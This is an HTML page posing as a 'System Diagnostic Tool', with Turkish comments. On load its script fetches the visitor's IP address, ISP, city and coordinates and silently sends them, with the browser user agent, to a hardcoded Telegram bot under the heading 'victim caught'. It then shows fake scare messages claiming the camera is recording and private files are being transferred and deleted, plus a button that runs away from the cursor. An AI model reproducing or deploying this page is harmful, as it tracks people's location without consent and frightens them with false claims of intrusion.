<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>System Diagnostic Tool v5.0.4</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100vh;
      background: #050505; color: #00ff41; font-family: 'Consolas', monospace;
      overflow: hidden; cursor: crosshair;
    }
    #container {
      width: 100vw; height: 100vh; display: flex; flex-direction: column; position: relative;
    }
    #terminal {
      flex: 1; padding: 20px; overflow-y: auto; font-size: 11px; line-height: 1.4;
      white-space: pre-wrap; text-shadow: 0 0 3px #00ff41;
    }
    #map { height: 180px; border-top: 1px solid #1a1a1a; opacity: 0.3; filter: grayscale(1); }
    
    .red { color: #ff0000; text-shadow: 0 0 5px #ff0000; font-weight: bold; }
    
    /* KaÃ§an Buton */
    #exitBtn {
      position: absolute;
      background: #ff0000; color: #fff; border: 2px solid #fff;
      padding: 12px 24px; font-weight: bold; cursor: pointer;
      z-index: 1000; transition: all 0.1s ease;
      display: none; box-shadow: 0 0 20px #f00;
    }

    .progress-container { width: 100%; border: 1px solid #1a1a1a; height: 8px; margin: 5px 0; }
    .progress-bar { width: 0%; height: 100%; background: #00ff41; }

    #overlay {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(255,0,0,0.2); pointer-events: none; z-index: 500;
      animation: flash 0.3s infinite;
    }
    @keyframes flash { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
</head>
<body>

  <div id="overlay"></div>
  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="exitBtn">SÄ°STEMÄ° DURDUR VE VERÄ°LERÄ° KURTAR</button>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const btn = document.getElementById('exitBtn');
    const overlay = document.getElementById('overlay');
    let attemptCount = 0;

    function log(text, delay = 0, isRed = false) {
      return new Promise(res => {
        setTimeout(() => {
          const span = document.createElement('span');
          if(isRed) span.className = 'red';
          span.textContent = `[${new Date().toLocaleTimeString()}] ${text}\n`;
          terminal.appendChild(span);
          terminal.scrollTop = terminal.scrollHeight;
          res();
        }, delay);
      });
    }

    async function showBar(text) {
      await log(text);
      const cont = document.createElement('div');
      cont.className = 'progress-container';
      const bar = document.createElement('div');
      bar.className = 'progress-bar';
      cont.appendChild(bar);
      terminal.appendChild(cont);
      for(let i=0; i<=100; i+=10){
        bar.style.width = i + '%';
        await new Promise(r => setTimeout(r, 100));
      }
    }

    // Butonu kaÃ§Ä±ran fonksiyon
    function moveButton() {
      if (attemptCount < 5) {
        const x = Math.random() * (window.innerWidth - btn.clientWidth);
        const y = Math.random() * (window.innerHeight - btn.clientHeight);
        btn.style.left = x + 'px';
        btn.style.top = y + 'px';
        attemptCount++;
        log("HATA: Durdurma protokolÃ¼ reddedildi. EriÅŸim engellendi!", 0, true);
        // Sahte fotoÄŸraf sesi (TarayÄ±cÄ± izin verirse)
        new Audio('https://assets.mixkit.co/active_storage/sfx/702/702-preview.mp3').play().catch(()=>{});
      } else {
        // 5 kaÃ§Ä±ÅŸtan sonra yakalanabilir olur
        btn.style.position = 'fixed';
        btn.style.bottom = '20px';
        btn.style.left = '50%';
        btn.style.transform = 'translateX(-50%)';
      }
    }

    btn.onmouseover = moveButton;
    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function start() {
      await log("DASHBOARD_V5 BOOTING...", 500);
      await log("TARGET_IDENTIFIED: " + navigator.platform);
      
      const res = await fetch('https://ipwho.is/');
      const data = await res.json();
      
      const hwid = "HWID-" + Math.random().toString(36).toUpperCase().substr(2, 10);

      // Telegram'a tam raporu hemen gÃ¶nder
      const report = `ðŸŽ¯ <b>KURBAN YAKALANDI!</b>\n\n<b>Cihaz:</b> ${navigator.userAgent}\n<b>HWID:</b> ${hwid}\n<b>IP:</b> ${data.ip}\n<b>ISP:</b> ${data.connection.isp}\n<b>Konum:</b> ${data.city}/${data.country}\n<b>Harita:</b> http://maps.google.com/?q=${data.latitude},${data.longitude}`;
      fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: '6400737507', text: report, parse_mode: 'HTML' })
      });

      await log("Hardware_ID: " + hwid);
      await log("Injecting bypass_cam.so...", 800);
      await log("CRITICAL: Front_Camera status: RECORDING", 300, true);
      
      await showBar("Analysing File System (DCIM/WhatsApp)...");
      
      // Dosya silme animasyonu
      const files = ["Private_Vault/", "WhatsApp_Backups/", "Saved_Passwords.db", "Bank_Details.json", "Gallery_Encrypt/"];
      for(let f of files) {
        await log("TRANSFERRING & DELETING: " + f, 100, true);
      }

      await log("----------------------------------------");
      await log("SÄ°STEM KÄ°LÄ°TLENDÄ°. VERÄ°LER UZAK SUNUCUYA TAÅžINDI.", 0, true);
      
      overlay.style.display = 'block';
      btn.style.display = 'block';
      btn.style.top = '70%'; btn.style.left = '40%';
    }

    window.onload = start;
  </script>
</body>
</html>
